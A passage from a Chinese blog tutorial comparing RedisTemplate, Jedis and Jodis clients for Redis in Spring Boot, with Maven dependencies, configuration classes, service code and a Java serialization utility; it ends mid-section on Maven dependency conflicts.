title=\"1.redis大概\"></a>1.redis大概</h4><p>1.Redis<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;  </span><br><span class=\"line\">\t&lt;groupId&gt;org.springframework.data&lt;/groupId&gt;  </span><br><span class=\"line\">\t&lt;artifactId&gt;spring-data-redis&lt;/artifactId&gt;  </span><br><span class=\"line\">\t&lt;version&gt;1.8.9.RELEASE&lt;/version&gt;  </span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>通过org.springframework.data.redis.connection.jedis.JedisConnectionFactory工厂类来管理，然后通过配置的模版bean，操作redis服务，代码段中充斥大量与业务无关的模版片段代码，代码冗余 <br><br>spring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api<br><br><a id=\"more\"></a><br>配置类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.redis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.cache.CacheManager;</span><br><span class=\"line\">import org.springframework.cache.annotation.CachingConfigurerSupport;</span><br><span class=\"line\">import org.springframework.cache.annotation.EnableCaching;</span><br><span class=\"line\">import org.springframework.context.annotation.Bean;</span><br><span class=\"line\">import org.springframework.context.annotation.Configuration;</span><br><span class=\"line\">import org.springframework.data.redis.cache.RedisCacheManager;</span><br><span class=\"line\">import org.springframework.data.redis.connection.RedisConnectionFactory;</span><br><span class=\"line\">import org.springframework.data.redis.core.RedisTemplate;</span><br><span class=\"line\">import org.springframework.data.redis.serializer.RedisSerializer;</span><br><span class=\"line\">import org.springframework.data.redis.serializer.StringRedisSerializer;</span><br><span class=\"line\"></span><br><span class=\"line\">@EnableCaching</span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">public class RedisConfig extends CachingConfigurerSupport &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public CacheManager cacheManager (RedisTemplate  redisTemplate)&#123;</span><br><span class=\"line\">        CacheManager cacheManager = new RedisCacheManager(redisTemplate);</span><br><span class=\"line\">        return cacheManager;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //spring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api</span><br><span class=\"line\">//    @Bean</span><br><span class=\"line\">    public RedisTemplate redisTemplate(RedisConnectionFactory factory)&#123;</span><br><span class=\"line\">        RedisTemplate&lt;String,Object&gt; redisTemplate = new RedisTemplate&lt;&gt;();</span><br><span class=\"line\">        //设置序列化方式,不设置value</span><br><span class=\"line\">        RedisSerializer redisSerializer =new StringRedisSerializer();</span><br><span class=\"line\">        redisTemplate.setKeySerializer(redisSerializer);</span><br><span class=\"line\">        redisTemplate.setHashKeySerializer(redisSerializer);</span><br><span class=\"line\">        //连接</span><br><span class=\"line\">        redisTemplate.setConnectionFactory(factory);</span><br><span class=\"line\">        return redisTemplate;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.redis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.data.redis.core.RedisTemplate;</span><br><span class=\"line\">import org.springframework.data.redis.core.ValueOperations;</span><br><span class=\"line\">import org.springframework.stereotype.Service;</span><br><span class=\"line\"></span><br><span class=\"line\">//@Service</span><br><span class=\"line\">public class RedisServer &#123;</span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    RedisTemplate redisTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        ValueOperations&lt;String,Object&gt; vo = redisTemplate.opsForValue();</span><br><span class=\"line\">        vo.set(key, value);</span><br><span class=\"line\">        //设置过期时间</span><br><span class=\"line\">        redisTemplate.expire(key,600,TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  Object getKey(String key)&#123;</span><br><span class=\"line\">        ValueOperations&lt;String,Object&gt; vo = redisTemplate.opsForValue();</span><br><span class=\"line\">        return vo.get(key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.Jedis<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!-- Springboot自带的redis与redis.clients有冲突，为了使用jodis,选redis.clients --&gt;</span><br><span class=\"line\">&lt;!--&lt;dependency&gt;--&gt;</span><br><span class=\"line\">    &lt;!--&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span><br><span class=\"line\">    &lt;!--&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;--&gt;</span><br><span class=\"line\">&lt;!--&lt;/dependency&gt;--&gt;</span><br></pre></td></tr></table></figure></p>\n<p>通过redis.clients.jedis.JedisPool来管理，即通过池来管理，通过池对象获取jedis实例，然后通过jedis实例直接操作redis服务，剔除了与业务无关的冗余代码<br><br></p>\n<p>配置类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Value;</span><br><span class=\"line\">import org.springframework.context.annotation.Bean;</span><br><span class=\"line\">import org.springframework.context.annotation.Configuration;</span><br><span class=\"line\">import org.springframework.context.annotation.PropertySource;</span><br><span class=\"line\">import redis.clients.jedis.JedisPool;</span><br><span class=\"line\">import redis.clients.jedis.JedisPoolConfig;</span><br><span class=\"line\"></span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">@PropertySource(&#123; &quot;classpath:application.properties&quot; &#125;)</span><br><span class=\"line\">public class JedisConfig &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public JedisPool getJedisPool()&#123;</span><br><span class=\"line\">        JedisPoolConfig config = new JedisPoolConfig();</span><br><span class=\"line\">        //连接设置</span><br><span class=\"line\">        //config.setMaxTotal(Integer.parseInt(maxTotal));</span><br><span class=\"line\">        //config.set（等等）</span><br><span class=\"line\">        //建立连接</span><br><span class=\"line\">        JedisPool jedisPool = new JedisPool(config, &quot;127.0.0.1&quot;, 6379);</span><br><span class=\"line\">        return jedisPool;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.stereotype.Service;</span><br><span class=\"line\">import redis.clients.jedis.Jedis;</span><br><span class=\"line\">import redis.clients.jedis.JedisPool;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">@Service</span><br><span class=\"line\">public class JedisServer &#123;</span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    JedisPool jedisPool;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        //try/catch后面添加</span><br><span class=\"line\">        Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">         //set(String, String) 所以List需要序列化,此处value为list</span><br><span class=\"line\">        //jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">        //设置过期时间</span><br><span class=\"line\">        jedis.setex(key.getBytes(),600, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Object getKey(String key)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">        if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">            return null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">        List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>3.Jodis<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.wandoulabs.jodis&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;jodis&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;0.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>与codis结合使用对jedispool做了封装。<br><br>通过zookeeper上注册的codis proxy个数创建相应个数的jedispool封装<br>为RoundRobinJedisPool，并监听节点的变化，proxy的地址会传回来，可以及时增删配置的jedispool<br></p>\n<p>配置类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jodis;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.wandoulabs.jodis.JedisResourcePool;</span><br><span class=\"line\">import com.wandoulabs.jodis.RoundRobinJedisPool;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Value;</span><br><span class=\"line\">import org.springframework.context.annotation.Bean;</span><br><span class=\"line\">import org.springframework.context.annotation.Configuration;</span><br><span class=\"line\">import org.springframework.context.annotation.PropertySource;</span><br><span class=\"line\">import redis.clients.jedis.JedisPoolConfig;</span><br><span class=\"line\"></span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">@PropertySource(&#123; &quot;classpath:application.properties&quot; &#125;)</span><br><span class=\"line\">public class JodisConfig &#123;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkPath&#125;&quot;)</span><br><span class=\"line\">    private String zkPath;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.product&#125;&quot;)</span><br><span class=\"line\">    private String product;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkPassword&#125;&quot;)</span><br><span class=\"line\">    private String zkPassword;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkTimeout&#125;&quot;)</span><br><span class=\"line\">    private int zkTimeout;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.maxTotal&#125;&quot;)</span><br><span class=\"line\">    private String maxTotal;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.maxWaitMillis&#125;&quot;)</span><br><span class=\"line\">    private String maxWaitMillis;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.poolMinIdle&#125;&quot;)</span><br><span class=\"line\">    private int poolMinIdele;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.poolMaxIdle&#125;&quot;)</span><br><span class=\"line\">    private int poolMaxIdle;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.testOnBorrow&#125;&quot;)</span><br><span class=\"line\">    private boolean testOnBorrow;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.testOnReturn&#125;&quot;)</span><br><span class=\"line\">    private boolean testOnReturn;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public JedisResourcePool zkJedisPool()&#123;</span><br><span class=\"line\">        JedisResourcePool jedisPool = null;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            JedisPoolConfig config = new JedisPoolConfig();</span><br><span class=\"line\">            config.setMaxTotal(Integer.parseInt(maxTotal));</span><br><span class=\"line\">            config.setMaxWaitMillis(Integer.parseInt(maxWaitMillis));</span><br><span class=\"line\">            config.setMaxIdle(poolMaxIdle);</span><br><span class=\"line\">            config.setMinIdle(poolMinIdele);</span><br><span class=\"line\">            config.setTestOnBorrow(testOnBorrow);</span><br><span class=\"line\">            config.setTestOnReturn(testOnReturn);</span><br><span class=\"line\">            jedisPool = RoundRobinJedisPool.create().curatorClient(zkPath, zkTimeout)</span><br><span class=\"line\">                    .zkProxyDir(product).password(zkPassword)</span><br><span class=\"line\">                    .poolConfig(config).build();</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            System.out.println(&quot;jodis 连接出错。&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return jedisPool;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jodis;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.example.redisdemo.jedis.ObjectTranscoder;</span><br><span class=\"line\">import com.wandoulabs.jodis.JedisResourcePool;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.stereotype.Service;</span><br><span class=\"line\">import redis.clients.jedis.Jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">@Service</span><br><span class=\"line\">public class JodisServer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    JedisResourcePool jedisResourcePool;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setKey(String key, Object value, int time)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        jedis.setex(key.getBytes(),time, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        System.out.println(&quot;ttl: &quot;);</span><br><span class=\"line\">        System.out.println(jedis.ttl(key));</span><br><span class=\"line\">        //long转int,向下转换，可能溢出，不能直接转换，所以long -&gt; String -&gt; int</span><br><span class=\"line\">        jedis.setex(key.getBytes(),Integer.parseInt(String.valueOf(jedis.ttl(key))), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">        //jedis.setex(key.getBytes(),20, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Object getKey(String key)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">            return null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">        List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2-一些注意事项\"><a href=\"#2-一些注意事项\" class=\"headerlink\" title=\"2.一些注意事项\"></a>2.一些注意事项</h4><p>1.存储数据<br>在jedis存储数据过程中<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public String set(String key, String value) &#123;</span><br><span class=\"line\">  this.checkIsInMultiOrPipeline();</span><br><span class=\"line\">  this.client.set(key, value);</span><br><span class=\"line\">  return this.client.getStatusCodeReply();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>类型为String,String 所以我们要存储List数据，需要先进行序列化<br><br>Serialization（序列化）是一种将对象以一连串的字节描述的过程；反序列化deserialization是一种将这些字节重建成一个对象的过程。<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//存</span><br><span class=\"line\">public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">  Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">  jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//取</span><br><span class=\"line\">public Object getKey(String key)&#123;</span><br><span class=\"line\">    Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">    if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">    List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">    return list;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>序列化工具类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\">//序列化工具类</span><br><span class=\"line\">public class ObjectTranscoder &#123;</span><br><span class=\"line\">    public static byte[] serialize(Object value) &#123;</span><br><span class=\"line\">        if (value == null) &#123;</span><br><span class=\"line\">            throw new NullPointerException(&quot;Can&apos;t serialize null&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] rv=null;</span><br><span class=\"line\">        ByteArrayOutputStream bos = null;</span><br><span class=\"line\">        ObjectOutputStream os = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            bos = new ByteArrayOutputStream();</span><br><span class=\"line\">            os = new ObjectOutputStream(bos);</span><br><span class=\"line\">            os.writeObject(value);</span><br><span class=\"line\">            os.close();</span><br><span class=\"line\">            bos.close();</span><br><span class=\"line\">            rv = bos.toByteArray();</span><br><span class=\"line\">        &#125; catch (IOException e) &#123;</span><br><span class=\"line\">            throw new IllegalArgumentException(&quot;Non-serializable object&quot;, e);</span><br><span class=\"line\">        &#125; finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(os!=null)os.close();</span><br><span class=\"line\">                if(bos!=null)bos.close();</span><br><span class=\"line\">            &#125;catch (Exception e2) &#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return rv;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Object deserialize(byte[] in) &#123;</span><br><span class=\"line\">        Object rv=null;</span><br><span class=\"line\">        ByteArrayInputStream bis = null;</span><br><span class=\"line\">        ObjectInputStream is = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            if(in != null) &#123;</span><br><span class=\"line\">                bis=new ByteArrayInputStream(in);</span><br><span class=\"line\">                is=new ObjectInputStream(bis);</span><br><span class=\"line\">                rv=is.readObject();</span><br><span class=\"line\">                is.close();</span><br><span class=\"line\">                bis.close();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(is!=null)is.close();</span><br><span class=\"line\">                if(bis!=null)bis.close();</span><br><span class=\"line\">            &#125; catch (Exception e2) &#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return rv;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.maven包冲突<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 